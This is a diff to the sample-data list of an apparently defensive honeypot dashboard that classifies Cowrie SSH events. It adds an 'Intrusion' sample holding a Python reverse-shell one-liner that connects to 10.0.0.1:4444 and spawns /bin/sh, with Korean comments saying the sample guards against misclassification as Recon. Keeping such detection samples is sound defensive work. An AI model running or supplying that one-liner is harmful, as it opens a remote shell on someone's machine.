@@ -50,6 +50,16 @@ SAMPLES = [
         "username": "admin", "password": "admin", "login_attempts": 1,
         "src_ip": "192.0.2.20", "dest_port": 80,
     }),
+    # 스크립트 언어 리버스셸. wget/curl 도 `/dev/tcp` 도 없어서, 규칙이
+    # 부분문자열 목록만 보던 시절에는 이런 행이 조용히 Recon 으로 떨어졌다.
+    # 시연 데이터에 이 경우가 하나도 없어 아무도 눈치채지 못했다 — 테스트를
+    # 쓰다가 드러났다. 회귀하면 대시보드에서 바로 보이도록 표본에 넣어둔다.
+    ("Intrusion", {
+        "type": "Cowrie", "protocol": "ssh", "eventid": "cowrie.command.input",
+        "input": "python -c 'import socket,os,pty;s=socket.socket();"
+                 "s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'",
+        "src_ip": "198.51.100.77", "dest_port": 22,
+    }),
 ]
 
 
@@ -74,6 +84,7 @@ ORIGINS = {
     "203.0.113.55": ("Netherlands",   "NL", "EU", 52.3676,    4.9041),
     "203.0.113.99": ("Brazil",        "BR", "SA", -23.5505, -46.6333),
     "192.0.2.20":   ("United States", "US", "NA", 37.7749, -122.4194),
+    "198.51.100.77": ("Vietnam",      "VN", "AS", 21.0278,  105.8342),
 }
 
 
